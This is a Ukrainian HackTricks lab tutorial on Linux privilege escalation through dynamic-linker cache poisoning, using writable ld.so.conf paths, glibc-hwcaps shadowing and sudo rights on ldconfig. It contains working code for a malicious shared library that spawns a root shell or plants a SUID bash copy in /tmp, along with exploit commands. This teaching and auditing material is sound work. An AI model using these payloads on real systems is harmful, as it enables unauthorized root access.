# Приклад експлойту privesc через ld.so

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка присвячена лабораторному середовищу для отруєння **кешу системного linker через `/etc/ld.so.conf` або `ldconfig`**. Для ін'єкції відсутньої бібліотеки, записуваного `RPATH`/`RUNPATH`, `LD_PRELOAD` та інших загальних способів зловживання linker у SUID див. [Зловживання SUID Shared Library і Linker](suid-shared-library-and-linker-abuse.md).

## Підготовка середовища

У наступному розділі наведено код файлів, які ми використовуватимемо для підготовки середовища.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в одній папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Скомпілюйте** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** бінарний файл.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди для triage

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, що **зараз розв’язує завантажувач**, і які налаштовані шляхи доступні для запису, не змінюючи активний кеш.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Використовуйте `ldd` лише для **trusted** executable. Деякі реалізації або незвичні ELF interpreters можуть спричинити виконання attacker-controlled code; `objdump -p ./file | grep NEEDED` безпечно виводить список прямих dependencies. Для trusted target виклик виявленого interpreter з `--list` показує фактичне resolution.<sup>[[4]](#references)</sup>

Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується вашим поточним shell. Натомість використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Бінарні файли **SUID/privileged** ігнорують `LD_LIBRARY_PATH`/`LD_PRELOAD` у
**secure-execution mode**, але directories з `/etc/ld.so.conf` усе ще є частиною trusted loader configuration, тому ця misconfiguration все ще може впливати на privileged programs.<sup>[[1]](#references)</sup>
- `LD_DEBUG` також ігнорується в secure-execution mode, якщо не існує `/etc/suid-debug`, тому збирайте його trace під час еквівалентного non-SUID run, а не очікуйте output від privileged execution.<sup>[[1]](#references)</sup>
- У новіших версіях glibc dynamic loader також надає
`--list-diagnostics`, що зручно для debug cache resolution і
вибору subdirectory `glibc-hwcaps`, коли hijack поводиться неочікувано.<sup>[[1]](#references)</sup>

### Обмеження cache і SONAME

`ldconfig` не кешує кожен довільний file у configured directory: він перевіряє ELF headers, розпізнає names, що відповідають `lib*.so*` або `ld-*.so*`, і очікує conventional chain `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Тому injected object має мати target architecture/class, точне `DT_NEEDED` name (зазвичай його `DT_SONAME`), а також усі symbols/versions, які victim resolves.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Надавайте перевагу бібліотеці, специфічній для цілі, як у цьому прикладі. Підміна поширеного SONAME неповним об'єктом може зламати кожен процес, який знаходить його до запуску призначеної привілейованої цілі.<sup>[[3]](#references)</sup>

## Exploit

У цьому сценарії ми припустимо, що **хтось створив вразливий запис** у файлі _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Уразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що пізніше вразливий бінарний файл буде виконано від імені **root** (або іншого привілейованого облікового запису), зазвичай краще залишити **артефакт, що належить root**, замість запуску інтерактивної оболонки. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання привілейованої операції можна використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, кеш за замовчуванням має бути перебудований після успішного привілейованого запуску **`ldconfig`**. Перезавантаження допомагає лише тоді, коли локальний процес завантаження справді запускає цю команду; інакше дочекайтеся дії адміністратора або скористайтеся небезпечним правилом sudo, якщо воно доступне.<sup>[[2]](#references)</sup>

Після цього **перевірте ще раз**, звідки виконуваний файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як видно, він **завантажує її з `/home/ubuntu/lib`**, і якщо будь-який користувач виконає її, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищили привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.

### Сучасне shadowing `glibc-hwcaps`

Починаючи з glibc 2.33, loader може надавати перевагу оптимізованим бібліотекам у `glibc-hwcaps/<level>/` всередині **кожного каталогу пошуку бібліотек**. Отже, перевірки лише `/home/ubuntu/lib` недостатньо: доступний для запису сумісний підкаталог, як-от `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, може підмінити базову бібліотеку після того, як `ldconfig` проіндексує її, тоді як інші CPU продовжать використовувати базовий об’єкт. Це також створює architecture-selective hijack, який можна пропустити, якщо validation виконується на іншому CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Поточні рекомендації з hardening glibc радять уникати дублікатів SONAME, нестандартних шляхів пошуку та об'єктів у підкаталогах `glibc-hwcaps`. З погляду аудиту рекурсивно перевіряйте права власності та можливість запису для налаштованих директорій і всіх компонентів їхніх батьківських шляхів.<sup>[[3]](#references)</sup>

### Інші неправильні конфігурації — та сама вразливість

У попередньому прикладі ми імітували неправильну конфігурацію, за якої адміністратор **вказав непривілейовану папку всередині конфігураційного файлу в `/etc/ld.so.conf.d/`**.\
Але існують й інші неправильні конфігурації, які можуть спричинити ту саму вразливість: якщо у вас є **права на запис** до якогось **конфігураційного файлу** всередині `/etc/ld.so.conf.d`, до папки `/etc/ld.so.conf.d` або до файлу `/etc/ld.so.conf`, ви можете налаштувати ту саму вразливість і експлуатувати її.

## Exploit 2

**Припустімо, що ви маєте права sudo для `ldconfig`**.\
Ви можете вказати `ldconfig`, **звідки завантажувати conf-файли**, тож ми можемо скористатися цим, щоб змусити `ldconfig` завантажити довільні папки.<sup>[[2]](#references)</sup>\
Отже, створімо файли й папки, необхідні для завантаження "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **попередньому exploit**, **створіть malicious library у `/tmp`**.\
І нарешті, завантажимо шлях і перевіримо, звідки binary завантажує library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як бачите, маючи sudo privileges для `ldconfig`, можна використати ту саму вразливість.** Деталі опцій мають значення під час оцінювання обмеженого правила sudo: `-f` вибирає іншу конфігурацію, але все одно перебудовує `/etc/ld.so.cache`; `-C` перенаправляє кеш в інше місце; `-N` запобігає перебудові кешу; а `-X` запобігає оновленню посилань, але **все одно перебудовує кеш, якщо не використовується разом із `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Зміцнення Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
